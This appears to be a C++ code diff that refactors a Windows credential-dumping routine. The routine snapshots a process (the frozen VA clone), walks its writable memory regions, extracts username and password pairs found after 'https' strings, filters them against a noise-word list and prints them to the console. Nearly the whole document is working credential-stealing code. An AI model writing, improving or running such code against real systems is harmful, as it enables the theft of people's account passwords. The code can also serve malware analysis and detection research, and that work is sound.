@@ -31,7 +31,8 @@ bool IsValid(const std::string& str) {
         "favicon", "lifecycle", "http", "bing", "msn", "microsoft", 
         "adobe", "protocol", "Signals", "scheme", "URIDetect", "Signin",
         "yandex", "clarity", "substrate", "office", "azu", "onenote",
-        "template", "fallback", "network", "bitdefender", "enabled", "disabled", "testing", "_mode", "auto_"
+        "template", "fallback", "network", "bitdefender", "enabled", 
+        "disabled", "testing", "_mode", "auto_"
     };
 
     for (const auto& word : noise) {
@@ -47,38 +48,41 @@ bool IsValid(const std::string& str) {
 
 
 
-// Scan memory of snapshot handle
-void ScanMemoryRegions(HANDLE hProcess, HPSS hSnapshot) {
+// Scan memory of the frozen VA clone
+void ScanMemoryRegions(HANDLE hFrozenClone, HPSS hSnapshot) {
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
-    std::wcout << L"Scanning regions for credentials..." << std::endl;
+    std::wcout << L"Scanning frozen snapshot regions..." << std::endl;
 
     HPSSWALK hWalker = NULL;
-    PssWalkMarkerCreate(NULL, &hWalker);
+
+    if (PssWalkMarkerCreate(NULL, &hWalker) != ERROR_SUCCESS)
+        return;
+
     PSS_VA_SPACE_ENTRY vaEntry;
-    
     std::set<std::string> seen;
 
     while (PssWalkSnapshot(hSnapshot, PSS_WALK_VA_SPACE, hWalker, &vaEntry, sizeof(vaEntry)) == ERROR_SUCCESS) {
-        // Bitmask check to catch all writable/executable pages while skipping guards
         bool isWritable = (vaEntry.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY));
         bool isGuarded = (vaEntry.Protect & (PAGE_GUARD | PAGE_NOACCESS));
 
         if (vaEntry.State == MEM_COMMIT && isWritable && !isGuarded) {
             std::vector<char> buffer(vaEntry.RegionSize);
-            SIZE_T bytesRead;
+            SIZE_T bytesRead = 0;
 
-            if (ReadProcessMemory(hProcess, vaEntry.BaseAddress, buffer.data(), vaEntry.RegionSize, &bytesRead)) {
-                std::string chunk;
-                chunk.reserve(bytesRead);
-                for (SIZE_T i = 0; i < bytesRead; ++i) {
-                    chunk += (buffer[i] == '\0') ? ' ' : buffer[i];
+            if (ReadProcessMemory(hFrozenClone, vaEntry.BaseAddress, buffer.data(), vaEntry.RegionSize, &bytesRead)) {
+                std::string chunk(buffer.data(), bytesRead);
+
+                for (auto& ch : chunk) {
+                    if (ch == '\0')
+                        ch = ' ';
                 }
 
                 size_t pos = 0;
+
                 while ((pos = chunk.find("https", pos)) != std::string::npos) {
                     size_t userStart = chunk.find_first_not_of(" \t\r\n", pos + 5);
                     size_t userEnd = chunk.find_first_of(" \t\r\n", userStart);
-                    
+
                     if (userStart != std::string::npos && userEnd != std::string::npos) {
                         size_t passStart = chunk.find_first_not_of(" \t\r\n", userEnd);
                         size_t passEnd = chunk.find_first_of(" \t\r\n", passStart);
@@ -89,22 +93,30 @@ void ScanMemoryRegions(HANDLE hProcess, HPSS hSnapshot) {
 
                             if (IsValid(user) && IsValid(pass)) {
                                 std::string entry = user + "|" + pass;
-                                if (seen.find(entry) == seen.end()) {
-                                    seen.insert(entry);
+
+                                if (seen.insert(entry).second) {
                                     std::cout << "------------------------------------------" << std::endl;
-                                    std::cout << "Username/eMail: "; SetColor(12);
-                                    std::cout << user << std::endl; SetColor(7);
-                                    std::cout << "Password:       "; SetColor(12);
-                                    std::cout << pass << std::endl; SetColor(7);
+
+                                    std::cout << "Username/eMail: ";
+                                    SetColor(12);
+                                    std::cout << user << std::endl;
+                                    SetColor(7);
+
+                                    std::cout << "Password:       ";
+                                    SetColor(12);
+                                    std::cout << pass << std::endl;
+                                    SetColor(7);
                                 }
                             }
                         }
                     }
+
                     pos += 5;
                 }
             }
         }
     }
+
     PssWalkMarkerFree(hWalker);
 }
 
